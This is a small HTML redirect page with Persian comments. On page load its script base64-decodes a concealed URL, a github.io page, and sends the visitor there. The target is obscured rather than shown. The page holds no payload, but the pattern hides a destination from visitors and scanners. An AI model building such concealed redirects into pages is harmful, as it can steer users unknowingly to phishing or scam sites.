<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // تابع برای رمزگذاری Base64
        function encodeBase64(input) {
            return btoa(input);
        }

        // تابع برای رمزگشایی Base64
        function decodeBase64(input) {
            return atob(input);
        }

        // آدرس رمزگذاری شده پیج دوم
        const encryptedUrl = "aHR0cHM6Ly9hbGlrcmF0b3MyOS5naXRodWIuaW8vcmVzcGluL25hbWUuaHRtbA==";

        // انتقال کاربر به پیج دوم
        window.onload = function() {
            const redirectUrl = decodeBase64(encryptedUrl);
            window.location.href = redirectUrl;
        };
    </script>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
